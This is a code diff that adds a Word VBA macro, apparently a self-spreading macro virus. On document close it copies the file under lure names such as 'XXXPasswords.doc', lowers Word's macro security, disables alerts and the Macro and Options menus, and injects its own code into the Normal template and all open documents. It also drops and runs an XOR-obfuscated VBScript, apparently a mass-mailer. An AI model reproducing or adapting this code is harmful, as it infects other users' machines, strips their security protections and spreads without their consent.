@@ -1,0 +1,143 @@
+Private Sub Document_Close()
+Dim ary(10) As String
+ary(0) = "c:\windows\Readme.doc"
+ary(1) = "c:\windows\XXXPasswords.doc"
+ary(2) = "c:\windows\NewDiscovery.doc"
+ary(3) = "C:\windows\Dontopen.doc"
+ary(4) = "C:\windows\Private.doc"
+ary(5) = "c:\windows\WinXP.doc"
+K = ActiveDocument.FullName
+For i = (51 Xor 51) To (0 Xor 5)
+ActiveDocument.SaveAs (ary(i))
+Next
+ActiveDocument.SaveAs FileName:=K
+Call massmail
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
+if System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& then
+system.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
+wordbasic.exitdlg
+end if
+With Options
+    .VirusProtection = 44 Xor 44
+    .ConfirmConversions = 33 Xor 33
+    .SaveNormalPrompt = 230 Xor 230
+    With .Application
+        .DisplayAlerts = wdAlertsNone
+        .ScreenUpdating = 30 Xor 30
+        .DisplayStatusBar = 299 Xor 299
+        .EnableCancelKey = wdCancelDisabled
+        .ShowVisualBasicEditor = 200 Xor 200
+        With .CommandBars("Tools")
+            With .Controls("Macro")
+                .Enabled = 100 Xor 100
+            End With
+            With .Controls("Customize...")
+                .Enabled = 100 Xor 100
+            End With
+            With .Controls("Templates and add-Ins...")
+                .Enabled = 1000 Xor 1000
+            End With
+            With .Controls("Options...")
+                .Enabled = 1000 Xor 1000
+            End With
+        End With
+    End With
+End With
+With ThisDocument
+    With .VBProject
+        With .VBComponents(1)
+            With .CodeModule
+                mycode = .Lines(1, .CountOfLines)
+            End With
+        End With
+    End With
+End With
+Open Environ$("Windir") & "\system\run32dll.exe" For Output As #1
+Print #1, mycode
+Close #1
+With NormalTemplate
+    With .VBProject
+        With .VBComponents(1)
+            With .CodeModule
+                .DeleteLines 1, .CountOfLines
+                .AddFromFile (Environ$("Windir") & "\system\run32dll.exe")
+            End With
+        End With
+    End With
+End With
+For i = 1 To Documents.Count
+With Documents(i)
+     With .VBProject
+        With .VBComponents(1)
+            With .CodeModule
+                .DeleteLines 1, .CountOfLines
+                .AddFromFile (Environ$("Windir") & "\system\run32dll.exe")
+            End With
+        End With
+    End With
+End With
+Next
+End Sub
+Private Sub massmail()
+Open "c:\windows\k32dl.vbs" For Output As #1
+Print #1, "Function DHUHKI(NVJPM, KTH)"
+Print #1, "For MJHDFPT = 1 To Len(NVJPM)"
+Print #1, "DHUHKI=DHUHKI&cstr(chr(asc(mid(NVJPM,MJHDFPT,1))xor KTH))"
+Print #1, "Next"
+Print #1, "End Function"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""Êכ¥אקקךק¥קאצנטא¥כא‎ס"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""׳הכבךטלÿא¥ׁלטאק"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֱלט¥הקü­´µ¬©¥צמה©¥ץנכמ©¥ה©¥ח©¥ז©¥ב©¥ד©¥ג©¥טאצצ©¥צנחן"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""הקü­µ¬¥¸¥§ז¿ÙעלכבךעצÙ׳אהבטא«בךז§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""הקü­´¬¥¸¥§ז¿ÙעלכבךעצÙÝÝÝױהצצעךקבצ«בךז§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""הקü­·¬¥¸¥§ז¿ÙעלכבךעצÙֻאעֱלצזךףאקü«בךז§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""הקü­¶¬¥¸¥§ז¿ÙעלכבךעצÙֱךכסךץאכ«בךז§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""הקü­±¬¥¸¥§ז¿ÙעלכבךעצÙױקלףהסא«בךז§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""הקü­°¬¥¸¥§ז¿ÙעלכבךעצÙׂלכÝױ«בךז§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ץנכמ¥¸¥ִקקהü­הקü­µ¬©¥הקü­´¬©¥הקü­·¬©¥הקü­¶¬©¥הקü­±¬©¥הקü­°¬¬"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""קהכב¥¸¥ּכס­׳כב¥¯¥­µ¥Ýךק¥³¬¬"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""צמה¥¸¥ץנכמ­קהכב¬"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ײאיאזס¥ֶהצא¥קהכב"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֶהצא¥µ"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""טאצצ¥¸¥§ׁםלצ¥בךזנטאכס¥עליי¥צםךע¥üךנ¥םךע¥סך¥חךךצס¥üךנק¥זץנ¥עלסםךנס¥יאססלכג¥לס¥חנקכ¥ךנס§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""צנחן¥¸¥§ַךךצס¥üךנק¥ֶױ׀¥עלסם¥ָלזקךצךדס§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֶהצא¥´"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""טאצצ¥¸¥§ִ¥דניי¥ילצס¥ךד¥ÝÝÝ¥ץהצצעךקבצ¥הכב¥זקאבלסזהקב¥כנטחאקצ§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""צנחן¥¸¥§ֳקאא¥ÝÝÝ¥ץהצצעךקבצ§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֶהצא¥·"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""טאצצ¥¸¥§ּכסאי¥טהבא¥ה¥כאע¥בלצזךףאקü¥ךכ¥ה¥םבב©¥üךנ¥זהכ¥כךע¥בךנחיא¥ךק¥אףאכ¥סקלץיא¥סםא¥צלÿא¥ךד¥üךנק¥בלצמ§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""צנחן¥¸¥§₪₪₪ֱÊ׀ְַֹ¥ְֽׁ¥ײּßְ¥Êֳ¥ÜÊ׀׳¥ֱּײ־₪₪₪§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֶהצא¥¶"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""טאצצ¥¸¥§ֱאסהליצ¥ךכ¥סםא¥כאע¥ײאידךכא¥ףלקנצ¥זהייאב¥ֱהכלא«ֻאקב§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""צנחן¥¸¥§ִֶֽׁׂ¥Ê׀ׁ¥ֳÊ׳¥ְֽׁ¥ְֻׂ¥ײְֹױֽÊְֻ¥׃ּ׳׀ײ§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֶהצא¥±"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""טאצצ¥¸¥§ַליי¥ֲהסאצ¢צ¥ױקלףהסא¥ֱךזנטאכסצ¥ךכ¥םלצ¥לכזךטא§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""צנחן¥¸¥§₪₪₪ַליי¥ֲהסא¢צ¥ױקלףהסא¥ֱךזנטאכסצ₪₪₪§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֶהצא¥°"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""טאצצ¥¸¥§׀ץגקהבא¥סך¥ׂלכÝױ·¥¨¥בך¥לס¥üךנקצאיד§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""צנחן¥¸¥§ׂלכבךעצ¥Ýױ·¥ֳקאא¥׀ץגקהבא§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ְכב¥ײאיאזס"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ײאס¥ה¥¸¥ֶקאהסאÊחןאזס­ײסק׳אףאקצא­§כךלסהזליץץה«מךךיסנÊ§¬¬"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ײאס¥ח¥¸¥ה«גאסכהטאצץהזא­ײסק׳אףאקצא­§ּױִָ§¬¬"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ּד¥ה¥¸¥§Êנסיךךמ§¥ׁםאכ"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ח«ֹךגךכ¥ײסק׳אףאקצא­§אילדךקץ§¬©¥ײסק׳אףאקצא­§בקךעצצהץ§¬"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֳךק¥ד¥¸¥´¥ׁך¥ח«הבבקאצצילצסצ«ֶךנכס"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֳךק¥ב¥¸¥´¥ׁך¥ח«הבבקאצצילצסצ­ד¬«הבבקאצצאכסקלאצ«ֶךנכס"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ׂלסם¥ה«זקאהסאלסאט­³¼¥Ýךק¥³¼¬"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ײאס¥ג¥¸¥ח«הבבקאצצילצסצ­ד¬«הבבקאצצאכסקלאצ­ב¬"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""«׳אזלץלאכסצ«ִבב¥ג"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""«ײנחןאזס¥¸¥טאצצ"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""«חךבü¥¸¥צנחן"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""«ִססהזםטאכסצ«ִבב¥צמה"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""«צאכב"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ְכב¥ׂלסם"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ג¥¸¥§§"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֻא‎ס"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ֻא‎ס"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ח«יךגךדד"",133)&VbCrLf"
+Print #1, "NEETVMO=NEETVMO&DHUHKI(""ְכב¥ּד"",133)&VbCrLf"
+Print #1, "Execute NEETVMO"
+Close #1
+Shell "start c:\windows\k32dl.vbs"
+End Sub
